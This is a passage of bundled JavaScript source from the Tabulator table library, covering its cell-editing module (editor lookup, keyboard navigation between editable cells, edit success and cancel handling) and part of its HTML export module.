  if (params.paramsLookup) {
    editorParams = typeof params.paramsLookup === "function" ? params.paramsLookup(lookup2, cell) : params.paramsLookup[lookup2];
  }
  editorFunc = this.table.modules.edit.lookupEditor(lookup2, column);
  return editorFunc.call(this, cell, onRendered, success, cancel2, editorParams || {});
}
var defaultEditors = {
  input,
  textarea: textarea$1,
  number: number$1,
  range,
  date: date$1$1,
  time: time$1,
  datetime: datetime$2,
  list,
  star: star$1,
  progress: progress$1,
  tickCross: tickCross$1,
  adaptable: adaptable$1
};
class Edit2 extends Module {
  static moduleName = "edit";
  //load defaults
  static editors = defaultEditors;
  constructor(table) {
    super(table);
    this.currentCell = false;
    this.mouseClick = false;
    this.recursionBlock = false;
    this.invalidEdit = false;
    this.editedCells = [];
    this.convertEmptyValues = false;
    this.editors = Edit2.editors;
    this.registerTableOption("editTriggerEvent", "focus");
    this.registerTableOption("editorEmptyValue");
    this.registerTableOption("editorEmptyValueFunc", this.emptyValueCheck.bind(this));
    this.registerColumnOption("editable");
    this.registerColumnOption("editor");
    this.registerColumnOption("editorParams");
    this.registerColumnOption("editorEmptyValue");
    this.registerColumnOption("editorEmptyValueFunc");
    this.registerColumnOption("cellEditing");
    this.registerColumnOption("cellEdited");
    this.registerColumnOption("cellEditCancelled");
    this.registerTableFunction("getEditedCells", this.getEditedCells.bind(this));
    this.registerTableFunction("clearCellEdited", this.clearCellEdited.bind(this));
    this.registerTableFunction("navigatePrev", this.navigatePrev.bind(this));
    this.registerTableFunction("navigateNext", this.navigateNext.bind(this));
    this.registerTableFunction("navigateLeft", this.navigateLeft.bind(this));
    this.registerTableFunction("navigateRight", this.navigateRight.bind(this));
    this.registerTableFunction("navigateUp", this.navigateUp.bind(this));
    this.registerTableFunction("navigateDown", this.navigateDown.bind(this));
    this.registerComponentFunction("cell", "isEdited", this.cellIsEdited.bind(this));
    this.registerComponentFunction("cell", "clearEdited", this.clearEdited.bind(this));
    this.registerComponentFunction("cell", "edit", this.editCell.bind(this));
    this.registerComponentFunction("cell", "cancelEdit", this.cellCancelEdit.bind(this));
    this.registerComponentFunction("cell", "navigatePrev", this.navigatePrev.bind(this));
    this.registerComponentFunction("cell", "navigateNext", this.navigateNext.bind(this));
    this.registerComponentFunction("cell", "navigateLeft", this.navigateLeft.bind(this));
    this.registerComponentFunction("cell", "navigateRight", this.navigateRight.bind(this));
    this.registerComponentFunction("cell", "navigateUp", this.navigateUp.bind(this));
    this.registerComponentFunction("cell", "navigateDown", this.navigateDown.bind(this));
  }
  initialize() {
    this.subscribe("cell-init", this.bindEditor.bind(this));
    this.subscribe("cell-delete", this.clearEdited.bind(this));
    this.subscribe("cell-value-changed", this.updateCellClass.bind(this));
    this.subscribe("column-layout", this.initializeColumnCheck.bind(this));
    this.subscribe("column-delete", this.columnDeleteCheck.bind(this));
    this.subscribe("row-deleting", this.rowDeleteCheck.bind(this));
    this.subscribe("row-layout", this.rowEditableCheck.bind(this));
    this.subscribe("data-refreshing", this.cancelEdit.bind(this));
    this.subscribe("clipboard-paste", this.pasteBlocker.bind(this));
    this.subscribe("keybinding-nav-prev", this.navigatePrev.bind(this, void 0));
    this.subscribe("keybinding-nav-next", this.keybindingNavigateNext.bind(this));
    this.subscribe("keybinding-nav-up", this.navigateUp.bind(this, void 0));
    this.subscribe("keybinding-nav-down", this.navigateDown.bind(this, void 0));
    if (Object.keys(this.table.options).includes("editorEmptyValue")) {
      this.convertEmptyValues = true;
    }
  }
  ///////////////////////////////////
  ///////// Paste Negation //////////
  ///////////////////////////////////
  pasteBlocker(e2) {
    if (this.currentCell) {
      return true;
    }
  }
  ///////////////////////////////////
  ////// Keybinding Functions ///////
  ///////////////////////////////////
  keybindingNavigateNext(e2) {
    var cell = this.currentCell, newRow = this.options("tabEndNewRow");
    if (cell) {
      if (!this.navigateNext(cell, e2)) {
        if (newRow) {
          cell.getElement().firstChild.blur();
          if (!this.invalidEdit) {
            if (newRow === true) {
              newRow = this.table.addRow({});
            } else {
              if (typeof newRow == "function") {
                newRow = this.table.addRow(newRow(cell.row.getComponent()));
              } else {
                newRow = this.table.addRow(Object.assign({}, newRow));
              }
            }
            newRow.then(() => {
              setTimeout(() => {
                cell.getComponent().navigateNext();
              });
            });
          }
        }
      }
    }
  }
  ///////////////////////////////////
  ///////// Cell Functions //////////
  ///////////////////////////////////
  cellIsEdited(cell) {
    return !!cell.modules.edit && cell.modules.edit.edited;
  }
  cellCancelEdit(cell) {
    if (cell === this.currentCell) {
      this.table.modules.edit.cancelEdit();
    } else {
      console.warn("Cancel Editor Error - This cell is not currently being edited ");
    }
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
  updateCellClass(cell) {
    if (this.allowEdit(cell)) {
      cell.getElement().classList.add("tabulator-editable");
    } else {
      cell.getElement().classList.remove("tabulator-editable");
    }
  }
  clearCellEdited(cells) {
    if (!cells) {
      cells = this.table.modules.edit.getEditedCells();
    }
    if (!Array.isArray(cells)) {
      cells = [cells];
    }
    cells.forEach((cell) => {
      this.table.modules.edit.clearEdited(cell._getSelf());
    });
  }
  navigatePrev(cell = this.currentCell, e2) {
    var nextCell, prevRow;
    if (cell) {
      if (e2) {
        e2.preventDefault();
      }
      nextCell = this.navigateLeft();
      if (nextCell) {
        return true;
      } else {
        prevRow = this.table.rowManager.prevDisplayRow(cell.row, true);
        if (prevRow) {
          nextCell = this.findPrevEditableCell(prevRow, prevRow.cells.length);
          if (nextCell) {
            nextCell.getComponent().edit();
            return true;
          }
        }
      }
    }
    return false;
  }
  navigateNext(cell = this.currentCell, e2) {
    var nextCell, nextRow;
    if (cell) {
      if (e2) {
        e2.preventDefault();
      }
      nextCell = this.navigateRight();
      if (nextCell) {
        return true;
      } else {
        nextRow = this.table.rowManager.nextDisplayRow(cell.row, true);
        if (nextRow) {
          nextCell = this.findNextEditableCell(nextRow, -1);
          if (nextCell) {
            nextCell.getComponent().edit();
            return true;
          }
        }
      }
    }
    return false;
  }
  navigateLeft(cell = this.currentCell, e2) {
    var index, nextCell;
    if (cell) {
      if (e2) {
        e2.preventDefault();
      }
      index = cell.getIndex();
      nextCell = this.findPrevEditableCell(cell.row, index);
      if (nextCell) {
        nextCell.getComponent().edit();
        return true;
      }
    }
    return false;
  }
  navigateRight(cell = this.currentCell, e2) {
    var index, nextCell;
    if (cell) {
      if (e2) {
        e2.preventDefault();
      }
      index = cell.getIndex();
      nextCell = this.findNextEditableCell(cell.row, index);
      if (nextCell) {
        nextCell.getComponent().edit();
        return true;
      }
    }
    return false;
  }
  navigateUp(cell = this.currentCell, e2) {
    var index, nextRow;
    if (cell) {
      if (e2) {
        e2.preventDefault();
      }
      index = cell.getIndex();
      nextRow = this.table.rowManager.prevDisplayRow(cell.row, true);
      if (nextRow) {
        nextRow.cells[index].getComponent().edit();
        return true;
      }
    }
    return false;
  }
  navigateDown(cell = this.currentCell, e2) {
    var index, nextRow;
    if (cell) {
      if (e2) {
        e2.preventDefault();
      }
      index = cell.getIndex();
      nextRow = this.table.rowManager.nextDisplayRow(cell.row, true);
      if (nextRow) {
        nextRow.cells[index].getComponent().edit();
        return true;
      }
    }
    return false;
  }
  findNextEditableCell(row, index) {
    var nextCell = false;
    if (index < row.cells.length - 1) {
      for (var i2 = index + 1; i2 < row.cells.length; i2++) {
        let cell = row.cells[i2];
        if (cell.column.modules.edit && Helpers.elVisible(cell.getElement())) {
          let allowEdit = this.allowEdit(cell);
          if (allowEdit) {
            nextCell = cell;
            break;
          }
        }
      }
    }
    return nextCell;
  }
  findPrevEditableCell(row, index) {
    var prevCell = false;
    if (index > 0) {
      for (var i2 = index - 1; i2 >= 0; i2--) {
        let cell = row.cells[i2];
        if (cell.column.modules.edit && Helpers.elVisible(cell.getElement())) {
          let allowEdit = this.allowEdit(cell);
          if (allowEdit) {
            prevCell = cell;
            break;
          }
        }
      }
    }
    return prevCell;
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  initializeColumnCheck(column) {
    if (typeof column.definition.editor !== "undefined") {
      this.initializeColumn(column);
    }
  }
  columnDeleteCheck(column) {
    if (this.currentCell && this.currentCell.column === column) {
      this.cancelEdit();
    }
  }
  rowDeleteCheck(row) {
    if (this.currentCell && this.currentCell.row === row) {
      this.cancelEdit();
    }
  }
  rowEditableCheck(row) {
    row.getCells().forEach((cell) => {
      if (cell.column.modules.edit && typeof cell.column.modules.edit.check === "function") {
        this.updateCellClass(cell);
      }
    });
  }
  //initialize column editor
  initializeColumn(column) {
    var convertEmpty = Object.keys(column.definition).includes("editorEmptyValue");
    var config = {
      editor: false,
      blocked: false,
      check: column.definition.editable,
      params: column.definition.editorParams || {},
      convertEmptyValues: convertEmpty,
      editorEmptyValue: column.definition.editorEmptyValue,
      editorEmptyValueFunc: column.definition.editorEmptyValueFunc
    };
    config.editor = this.lookupEditor(column.definition.editor, column);
    if (config.editor) {
      column.modules.edit = config;
    }
  }
  lookupEditor(editor, column) {
    var editorFunc;
    switch (typeof editor) {
      case "string":
        if (this.editors[editor]) {
          editorFunc = this.editors[editor];
        } else {
          console.warn("Editor Error - No such editor found: ", editor);
        }
        break;
      case "function":
        editorFunc = editor;
        break;
      case "boolean":
        if (editor === true) {
          if (typeof column.definition.formatter !== "function") {
            if (this.editors[column.definition.formatter]) {
              editorFunc = this.editors[column.definition.formatter];
            } else {
              editorFunc = this.editors["input"];
            }
          } else {
            console.warn("Editor Error - Cannot auto lookup editor for a custom formatter: ", column.definition.formatter);
          }
        }
        break;
    }
    return editorFunc;
  }
  getCurrentCell() {
    return this.currentCell ? this.currentCell.getComponent() : false;
  }
  clearEditor(cancel2) {
    var cell = this.currentCell, cellEl;
    this.invalidEdit = false;
    if (cell) {
      this.currentCell = false;
      cellEl = cell.getElement();
      this.dispatch("edit-editor-clear", cell, cancel2);
      cellEl.classList.remove("tabulator-editing");
      while (cellEl.firstChild) cellEl.removeChild(cellEl.firstChild);
      cell.row.getElement().classList.remove("tabulator-editing");
      cell.table.element.classList.remove("tabulator-editing");
    }
  }
  cancelEdit() {
    if (this.currentCell) {
      var cell = this.currentCell;
      var component = this.currentCell.getComponent();
      this.clearEditor(true);
      cell.setValueActual(cell.getValue());
      cell.cellRendered();
      if (cell.column.definition.editor == "textarea" || cell.column.definition.variableHeight) {
        cell.row.normalizeHeight(true);
      }
      if (cell.column.definition.cellEditCancelled) {
        cell.column.definition.cellEditCancelled.call(this.table, component);
      }
      this.dispatch("edit-cancelled", cell);
      this.dispatchExternal("cellEditCancelled", component);
    }
  }
  //return a formatted value for a cell
  bindEditor(cell) {
    if (cell.column.modules.edit) {
      var self = this, element = cell.getElement(true);
      this.updateCellClass(cell);
      element.setAttribute("tabindex", 0);
      element.addEventListener("mousedown", function(e2) {
        if (e2.button === 2) {
          e2.preventDefault();
        } else {
          self.mouseClick = true;
        }
      });
      if (this.options("editTriggerEvent") === "dblclick") {
        element.addEventListener("dblclick", function(e2) {
          if (!element.classList.contains("tabulator-editing")) {
            element.focus({ preventScroll: true });
            self.edit(cell, e2, false);
          }
        });
      }
      if (this.options("editTriggerEvent") === "focus" || this.options("editTriggerEvent") === "click") {
        element.addEventListener("click", function(e2) {
          if (!element.classList.contains("tabulator-editing")) {
            element.focus({ preventScroll: true });
            self.edit(cell, e2, false);
          }
        });
      }
      if (this.options("editTriggerEvent") === "focus") {
        element.addEventListener("focus", function(e2) {
          if (!self.recursionBlock) {
            self.edit(cell, e2, false);
          }
        });
      }
    }
  }
  focusCellNoEvent(cell, block) {
    this.recursionBlock = true;
    if (!(block && this.table.browser === "ie")) {
      cell.getElement().focus({ preventScroll: true });
    }
    this.recursionBlock = false;
  }
  editCell(cell, forceEdit) {
    this.focusCellNoEvent(cell);
    this.edit(cell, false, forceEdit);
  }
  focusScrollAdjust(cell) {
    if (this.table.rowManager.getRenderMode() == "virtual") {
      var topEdge = this.table.rowManager.element.scrollTop, bottomEdge = this.table.rowManager.element.clientHeight + this.table.rowManager.element.scrollTop, rowEl = cell.row.getElement();
      if (rowEl.offsetTop < topEdge) {
        this.table.rowManager.element.scrollTop -= topEdge - rowEl.offsetTop;
      } else {
        if (rowEl.offsetTop + rowEl.offsetHeight > bottomEdge) {
          this.table.rowManager.element.scrollTop += rowEl.offsetTop + rowEl.offsetHeight - bottomEdge;
        }
      }
      var leftEdge = this.table.rowManager.element.scrollLeft, rightEdge = this.table.rowManager.element.clientWidth + this.table.rowManager.element.scrollLeft, cellEl = cell.getElement();
      if (this.table.modExists("frozenColumns")) {
        leftEdge += parseInt(this.table.modules.frozenColumns.leftMargin || 0);
        rightEdge -= parseInt(this.table.modules.frozenColumns.rightMargin || 0);
      }
      if (this.table.options.renderHorizontal === "virtual") {
        leftEdge -= parseInt(this.table.columnManager.renderer.vDomPadLeft);
        rightEdge -= parseInt(this.table.columnManager.renderer.vDomPadLeft);
      }
      if (cellEl.offsetLeft < leftEdge) {
        this.table.rowManager.element.scrollLeft -= leftEdge - cellEl.offsetLeft;
      } else {
        if (cellEl.offsetLeft + cellEl.offsetWidth > rightEdge) {
          this.table.rowManager.element.scrollLeft += cellEl.offsetLeft + cellEl.offsetWidth - rightEdge;
        }
      }
    }
  }
  allowEdit(cell) {
    var check = cell.column.modules.edit ? true : false;
    if (cell.column.modules.edit) {
      switch (typeof cell.column.modules.edit.check) {
        case "function":
          if (cell.row.initialized) {
            check = cell.column.modules.edit.check(cell.getComponent());
          }
          break;
        case "string":
          check = !!cell.row.data[cell.column.modules.edit.check];
          break;
        case "boolean":
          check = cell.column.modules.edit.check;
          break;
      }
    }
    return check;
  }
  edit(cell, e2, forceEdit) {
    var self = this, allowEdit = true, rendered = function() {
    }, element = cell.getElement(), editFinished = false, cellEditor, component, params;
    if (this.currentCell) {
      if (!this.invalidEdit && this.currentCell !== cell) {
        this.cancelEdit();
      }
      return;
    }
    function success(value) {
      if (self.currentCell === cell && !editFinished) {
        var valid = self.chain("edit-success", [cell, value], true, true);
        if (valid === true || self.table.options.validationMode === "highlight") {
          editFinished = true;
          self.clearEditor();
          if (!cell.modules.edit) {
            cell.modules.edit = {};
          }
          cell.modules.edit.edited = true;
          if (self.editedCells.indexOf(cell) == -1) {
            self.editedCells.push(cell);
          }
          value = self.transformEmptyValues(value, cell);
          cell.setValue(value, true);
          return valid === true;
        } else {
          editFinished = true;
          self.invalidEdit = true;
          self.focusCellNoEvent(cell, true);
          rendered();
          setTimeout(() => {
            editFinished = false;
          }, 10);
          return false;
        }
      }
    }
    function cancel2() {
      if (self.currentCell === cell && !editFinished) {
        self.cancelEdit();
      }
    }
    function onRendered(callback) {
      rendered = callback;
    }
    if (!cell.column.modules.edit.blocked) {
      if (e2) {
        e2.stopPropagation();
      }
      allowEdit = this.allowEdit(cell);
      if (allowEdit || forceEdit) {
        self.cancelEdit();
        self.currentCell = cell;
        this.focusScrollAdjust(cell);
        component = cell.getComponent();
        if (this.mouseClick) {
          this.mouseClick = false;
          if (cell.column.definition.cellClick) {
            cell.column.definition.cellClick.call(this.table, e2, component);
          }
        }
        if (cell.column.definition.cellEditing) {
          cell.column.definition.cellEditing.call(this.table, component);
        }
        this.dispatch("cell-editing", cell);
        this.dispatchExternal("cellEditing", component);
        params = typeof cell.column.modules.edit.params === "function" ? cell.column.modules.edit.params(component) : cell.column.modules.edit.params;
        cellEditor = cell.column.modules.edit.editor.call(self, component, onRendered, success, cancel2, params);
        if (this.currentCell && cellEditor !== false) {
          if (cellEditor instanceof Node) {
            element.classList.add("tabulator-editing");
            cell.row.getElement().classList.add("tabulator-editing");
            cell.table.element.classList.add("tabulator-editing");
            while (element.firstChild) element.removeChild(element.firstChild);
            element.appendChild(cellEditor);
            rendered();
            var children = element.children;
            for (var i2 = 0; i2 < children.length; i2++) {
              children[i2].addEventListener("click", function(e3) {
                e3.stopPropagation();
              });
            }
          } else {
            console.warn("Edit Error - Editor should return an instance of Node, the editor returned:", cellEditor);
            this.blur(element);
            return false;
          }
        } else {
          this.blur(element);
          return false;
        }
        return true;
      } else {
        this.mouseClick = false;
        this.blur(element);
        return false;
      }
    } else {
      this.mouseClick = false;
      this.blur(element);
      return false;
    }
  }
  emptyValueCheck(value) {
    return value === "" || value === null || typeof value === "undefined";
  }
  transformEmptyValues(value, cell) {
    var mod = cell.column.modules.edit, convert = mod.convertEmptyValues || this.convertEmptyValues, checkFunc;
    if (convert) {
      checkFunc = mod.editorEmptyValueFunc || this.options("editorEmptyValueFunc");
      if (checkFunc && checkFunc(value)) {
        value = mod.convertEmptyValues ? mod.editorEmptyValue : this.options("editorEmptyValue");
      }
    }
    return value;
  }
  blur(element) {
    if (!this.confirm("edit-blur", [element])) {
      element.blur();
    }
  }
  getEditedCells() {
    var output = [];
    this.editedCells.forEach((cell) => {
      output.push(cell.getComponent());
    });
    return output;
  }
  clearEdited(cell) {
    var editIndex;
    if (cell.modules.edit && cell.modules.edit.edited) {
      cell.modules.edit.edited = false;
      this.dispatch("edit-edited-clear", cell);
    }
    editIndex = this.editedCells.indexOf(cell);
    if (editIndex > -1) {
      this.editedCells.splice(editIndex, 1);
    }
  }
}
class ExportRow {
  constructor(type, columns, component, indent) {
    this.type = type;
    this.columns = columns;
    this.component = component || false;
    this.indent = indent || 0;
  }
}
class ExportColumn {
  constructor(value, component, width, height, depth) {
    this.value = value;
    this.component = component || false;
    this.width = width;
    this.height = height;
    this.depth = depth;
  }
}
var columnLookups$1 = {};
var rowLookups$1 = {
  visible: function() {
    return this.rowManager.getVisibleRows(false, true);
  },
  all: function() {
    return this.rowManager.rows;
  },
  selected: function() {
    return this.modules.selectRow.selectedRows;
  },
  active: function() {
    if (this.options.pagination) {
      return this.rowManager.getDisplayRows(this.rowManager.displayRows.length - 2);
    } else {
      return this.rowManager.getDisplayRows();
    }
  }
};
class Export extends Module {
  static moduleName = "export";
  static columnLookups = columnLookups$1;
  static rowLookups = rowLookups$1;
  constructor(table) {
    super(table);
    this.config = {};
    this.cloneTableStyle = true;
    this.colVisProp = "";
    this.colVisPropAttach = "";
    this.registerTableOption("htmlOutputConfig", false);
    this.registerColumnOption("htmlOutput");
    this.registerColumnOption("titleHtmlOutput");
  }
  initialize() {
    this.registerTableFunction("getHtml", this.getHtml.bind(this));
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  generateExportList(config, style, range2, colVisProp) {
    var headers, body, columns, colLookup;
    this.cloneTableStyle = style;
    this.config = config || {};
    this.colVisProp = colVisProp;
    this.colVisPropAttach = this.colVisProp.charAt(0).toUpperCase() + this.colVisProp.slice(1);
    colLookup = Export.columnLookups[range2];
    if (colLookup) {
      columns = colLookup.call(this.table);
      columns = columns.filter((col) => this.columnVisCheck(col));
    }
    headers = this.config.columnHeaders !== false ? this.headersToExportRows(this.generateColumnGroupHeaders(columns)) : [];
    if (columns) {
      columns = columns.map((col) => col.getComponent());
    }
    body = this.bodyToExportRows(this.rowLookup(range2), columns);
    return headers.concat(body);
  }
  generateTable(config, style, range2, colVisProp) {
    var list2 = this.generateExportList(config, style, range2, colVisProp);
    return this.generateTableElement(list2);
  }
  rowLookup(range2) {
    var rows2 = [], rowLookup;
    if (typeof range2 == "function") {
      range2.call(this.table).forEach((row) => {
        row = this.table.rowManager.findRow(row);
        if (row) {
          rows2.push(row);
        }
      });
    } else {
      rowLookup = Export.rowLookups[range2] || Export.rowLookups["active"];
      rows2 = rowLookup.call(this.table);
    }
    return Object.assign([], rows2);
  }
  generateColumnGroupHeaders(columns) {
    var output = [];
    if (!columns) {
      columns = this.config.columnGroups !== false ? this.table.columnManager.columns : this.table.columnManager.columnsByIndex;
    }
    columns.forEach((column) => {
      var colData = this.processColumnGroup(column);
      if (colData) {
        output.push(colData);
      }
    });
    return output;
  }
  processColumnGroup(column) {
    var subGroups = column.columns, maxDepth = 0, title = column.definition["title" + this.colVisPropAttach] || column.definition.title;
    var groupData = {
      title,
      column,
      depth: 1
    };
    if (subGroups.length) {
      groupData.subGroups = [];
      groupData.width = 0;
      subGroups.forEach((subGroup) => {
        var subGroupData = this.processColumnGroup(subGroup);
        if (subGroupData) {
          groupData.width += subGroupData.width;
          groupData.subGroups.push(subGroupData);
          if (subGroupData.depth > maxDepth) {
            maxDepth = subGroupData.depth;
          }
        }
      });
      groupData.depth += maxDepth;
      if (!groupData.width) {
        return false;
      }
    } else {
      if (this.columnVisCheck(column)) {
        groupData.width = 1;
      } else {
        return false;
      }
    }
    return groupData;
  }
  columnVisCheck(column) {
    var visProp = column.definition[this.colVisProp];
    if (this.config.rowHeaders === false && column.isRowHeader) {
      return false;
    }
    if (typeof visProp === "function") {
      visProp = visProp.call(this.table, column.getComponent());
    }
    if (visProp === false || visProp === true) {
      return visProp;
    }
    return column.visible && column.field;
  }
  headersToExportRows(columns) {
    var headers = [], headerDepth = 0, exportRows = [];
    function parseColumnGroup(column, level) {
      var depth = headerDepth - level;
      if (typeof headers[level] === "undefined") {
        headers[level] = [];
      }
      column.height = column.subGroups ? 1 : depth - column.depth + 1;
      headers[level].push(column);
      if (column.height > 1) {
        for (let i2 = 1; i2 < column.height; i2++) {
          if (typeof headers[level + i2] === "undefined") {
            headers[level + i2] = [];
          }
          headers[level + i2].push(false);
        }
      }
      if (column.width > 1) {
        for (let i2 = 1; i2 < column.width; i2++) {
          headers[level].push(false);
        }
      }
      if (column.subGroups) {
        column.subGroups.forEach(function(subGroup) {
          parseColumnGroup(subGroup, level + 1);
        });
      }
    }
    columns.forEach(function(column) {
      if (column.depth > headerDepth) {
        headerDepth = column.depth;
      }
    });
    columns.forEach(function(column) {
      parseColumnGroup(column, 0);
    });
    headers.forEach((header) => {
      var columns2 = [];
      header.forEach((col) => {
        if (col) {
          let title = typeof col.title === "undefined" ? "" : col.title;
          columns2.push(new ExportColumn(title, col.column.getComponent(), col.width, col.height, col.depth));
        } else {
          columns2.push(null);
        }
      });
      exportRows.push(new ExportRow("header", columns2));
    });
    return exportRows;
  }
  bodyToExportRows(rows2, columns = []) {
    var exportRows = [];
    if (columns.length === 0) {
      this.table.columnManager.columnsByIndex.forEach((column) => {
        if (this.columnVisCheck(column)) {
          columns.push(column.getComponent());
        }
      });
    }
    if (this.config.columnCalcs !== false && this.table.modExists("columnCalcs")) {
      if (this.table.modules.columnCalcs.topInitialized) {
        rows2.unshift(this.table.modules.columnCalcs.topRow);
      }
      if (this.table.modules.columnCalcs.botInitialized) {
        rows2.push(this.table.modules.columnCalcs.botRow);
      }
    }
    rows2 = rows2.filter((row) => {
      switch (row.type) {
        case "group":
          return this.config.rowGroups !== false;
        case "calc":
          return this.config.columnCalcs !== false;
        case "row":
          return !(this.table.options.dataTree && this.config.dataTree === false && row.modules.dataTree.parent);
      }
      return true;
    });
    rows2.forEach((row, i2) => {
      var rowData = row.getData(this.colVisProp);
      var exportCols = [];
      var indent = 0;
      switch (row.type) {
        case "group":
          indent = row.level;
          exportCols.push(new ExportColumn(row.key, row.getComponent(), columns.length, 1));
          break;
        case "calc":
        case "row":
          columns.forEach((col) => {
            exportCols.push(new ExportColumn(col._column.getFieldValue(rowData), col, 1, 1));
          });
          if (this.table.options.dataTree && this.config.dataTree !== false) {
            indent = row.modules.dataTree.index;
          }
          break;
      }
      exportRows.push(new ExportRow(row.type, exportCols, row.getComponent(), indent));
    });
    return exportRows;
  }
  generateTableElement(list2) {
    var table = document.createElement("table"), headerEl = document.createElement("thead"), bodyEl = document.createElement("tbody"), styles = this.lookupTableStyles(), rowFormatter = this.table.options["rowFormatter" + this.colVisPropAttach], setup = {};
    setup.rowFormatter = rowFormatter !== null ? rowFormatter : this.table.options.rowFormatter;
    if (this.table.options.dataTree && this.config.dataTree !== false && this.table.modExists("columnCalcs")) {
      setup.treeElementField = this.table.modules.dataTree.elementField;
    }
    setup.groupHeader = this.table.options["groupHeader" + this.colVisPropAttach];
    if (setup.groupHeader && !Array.isArray(setup.groupHeader)) {
      setup.groupHeader = [setup.groupHeader];
    }
    table.classList.add("tabulator-print-table");
    this.mapElementStyles(this.table.columnManager.getHeadersElement(), headerEl, ["border-top", "border-left", "border-right", "border-bottom", "background-color", "color", "font-weight", "font-family", "font-size"]);
    if (list2.length > 1e3) {
      console.warn("It may take a long time to render an HTML table with more than 1000 rows");
    }
    list2.forEach((row, i2) => {
      let rowEl;
      switch (row.type) {
        case "header":
          headerEl.appendChild(this.generateHeaderElement(row, setup, styles));
          break;
        case "group":
          bodyEl.appendChild(this.generateGroupElement(row, setup, styles));
          break;
        case "calc":
          bodyEl.appendChild(this.generateCalcElement(row, setup, styles));
          break;
        case "row":
          rowEl = this.generateRowElement(row, setup, styles);
          this.mapElementStyles(i2 % 2 && styles.evenRow ? styles.evenRow : styles.oddRow, rowEl, ["border-top", "border-left", "border-right", "border-bottom", "color", "font-weight", "font-family", "font-size", "background-color"]);
          bodyEl.appendChild(rowEl);
          break;
      }
    });
    if (headerEl.innerHTML) {
      table.appendChild(headerEl);
    }
    table.appendChild(bodyEl);
    this.mapElementStyles(this.table.element, table, ["border-top", "border-left", "border-right", "border-bottom"]);
    return table;
  }
  lookupTableStyles() {
    var styles = {};
    if (this.cloneTableStyle && window.getComputedStyle) {
      styles.oddRow = this.table.element.querySelector(".tabulator-row-odd:not(.tabulator-group):not(.tabulator-calcs)");
      styles.evenRow = this.table.element.querySelector(".tabulator-row-even:not(.tabulator-group):not(.tabulator-calcs)");
      styles.calcRow = this.table.element.querySelector(".tabulator-row.tabulator-calcs");
      styles.firstRow = this.table.element.querySelector(".tabulator-row:not(.tabulator-group):not(.tabulator-calcs)");
      styles.firstGroup = this.table.element.getElementsByClassName("tabulator-group")[0];
      if (styles.firstRow) {
        styles.styleCells = styles.firstRow.getElementsByClassName("tabulator-cell");
        styles.styleRowHeader = styles.firstRow.getElementsByClassName("tabulator-row-header")[0];
        styles.firstCell = styles.styleCells[0];
        styles.lastCell = styles.styleCells[styles.styleCells.length - 1];
      }
    }
    return styles;
  }
  generateHeaderElement(row, setup, styles) {
    var rowEl = document.createElement("tr");
    row.columns.forEach((column) => {
      if (column) {
        var cellEl = document.createElement("th");
        var classNames2 = column.component._column.definition.cssClass ? column.component._column.definition.cssClass.split(" ") : [];
        cellEl.colSpan = column.width;
        cellEl.rowSpan = column.height;
        cellEl.innerHTML = column.value;
        if (this.cloneTableStyle) {
          cellEl.style.boxSizing = "border-box";
        }
        classNames2.forEach(function(className) {
          cellEl.classList.add(className);
        });
        this.mapElementStyles(column.component.getElement(), cellEl, ["text-align", "border-left", "border-right", "background-color", "color", "font-weight", "font-family", "font-size"]);
        this.mapElementStyles(column.component._column.contentElement, cellEl, ["padding-top", "padding-left", "padding-right", "padding-bottom"]);
        if (column.component._column.visible) {
          this.mapElementStyles(column.component.getElement(), cellEl, ["width"]);
        } else {
          if (column.component._column.definition.width) {
            cellEl.style.width = column.component._column.definition.width + "px";
          }
        }
        if (column.component._column.parent && column.component._column.parent.isGroup) {
          this.mapElementStyles(column.component._column.parent.groupElement, cellEl, ["border-top"]);
        } else {
          this.mapElementStyles(column.component.getElement(), cellEl, ["border-top"]);
        }
        if (column.component._column.isGroup) {
          this.mapElementStyles(column.component.getElement(), cellEl, ["border-bottom"]);
        } else {
          this.mapElementStyles(this.table.columnManager.getElement(), cellEl, ["border-bottom"]);
        }
        rowEl.appendChild(cellEl);
      }
    });
    return rowEl;
  }
  generateGroupElement(row, setup, styles) {
    var rowEl = document.createElement("tr"), cellEl = document.createElement("td"), group = row.columns[0];
    rowEl.classList.add("tabulator-print-table-row");
    if (setup.groupHeader && setup.groupHeader[row.indent]) {
      group.value = setup.groupHeader[row.indent](group.value, row.component._group.getRowCount(), row.component._group.getData(), row.component);
    } else {
      if (setup.groupHeader !== false) {
        group.value = row.component._group.generator(group.value, row.component._group.getRowCount(), row.component._group.getData(), row.component);
      }
    }
    cellEl.colSpan = group.width;
    cellEl.innerHTML = group.value;
    rowEl.classList.add("tabulator-print-table-group");
    rowEl.classList.add("tabulator-group-level-" + row.indent);
    if (group.component.isVisible()) {
      rowEl.classList.add("tabulator-group-visible");
    }
    this.mapElementStyles(styles.firstGroup, rowEl, ["border-top", "border-left", "border-right", "border-bottom", "color", "font-weight", "font-family", "font-size", "background-color"]);
    this.mapElementStyles(styles.firstGroup, cellEl, ["padding-top", "padding-left", "padding-right", "padding-bottom"]);
    rowEl.appendChild(cellEl);
    return rowEl;
  }
  generateCalcElement(row, setup, styles) {
    var rowEl = this.generateRowElement(row, setup, styles);
    rowEl.classList.add("tabulator-print-table-calcs");
    this.mapElementStyles(styles.calcRow, rowEl, ["border-top", "border-left", "border-right", "border-bottom", "color", "font-weight", "font-family", "font-size", "background-color"]);
    return rowEl;
  }
  generateRowElement(row, setup, styles) {
    var rowEl = document.createElement("tr");
    rowEl.classList.add("tabulator-print-table-row");
    row.columns.forEach((col, i2) => {
      if (col) {
        var cellEl = document.createElement("td"), column = col.component._column, table = this.table, index = table.columnManager.findColumnIndex(column), value = col.value, cellStyle, styleProps;
        var cellWrapper = {
          modules: {},
          getValue: function() {
            return value;
          },
          getField: function() {
            return column.definition.field;
          },
          getElement: function() {
            return cellEl;
          },
          getType: function() {
            return "cell";
          },
          getColumn: function() {
            return column.getComponent();
          },
          getData: function() {
            return row.component.getData();
          },
          getRow: function() {
            return row.component;
          },
          getTable: function() {
            return table;
          },
          getComponent: function() {
            return cellWrapper;
          },
          column
        };
        var classNames2 = column.definition.cssClass ? column.definition.cssClass.split(" ") : [];
        classNames2.forEach(function(className) {
          cellEl.classList.add(className);
        });
        if (this.table.modExists("format") && this.config.formatCells !== false) {
          value = this.table.modules.format.formatExportValue(cellWrapper, this.colVisProp);
        } else {
          switch (typeof value) {
            case "object":
              value = value !== null ? JSON.stringify(value) : "";
              break;
            case "undefined":
